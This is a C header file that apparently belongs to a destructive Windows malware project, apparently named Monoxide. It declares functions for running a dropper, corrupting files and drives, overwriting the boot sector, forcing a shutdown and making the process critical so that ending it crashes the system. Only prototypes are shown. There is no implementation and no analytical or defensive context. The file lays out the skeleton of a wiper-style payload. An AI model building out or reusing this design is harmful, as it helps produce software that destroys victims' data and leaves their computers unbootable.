#pragma once
#include "monoxide.h"

#define NUM_ACES 2

typedef enum _SHUTDOWN_ACTION
{
    ShutdownNoReboot,
    ShutdownReboot,
    ShutdownPowerOff
} SHUTDOWN_ACTION, *PSHUTDOWN_ACTION;

BOOL
WINAPI
ExecuteDropper( VOID );

VOID
WINAPI
DriveMess( VOID );

BOOL
WINAPI
FileMess(
    _In_ PWSTR szDirectory
);

BOOL
WINAPI
OverwriteBoot( VOID );

BOOL
WINAPI
ForceShutdownComputer( VOID );

BOOL
WINAPI
SetProcessCritical( VOID );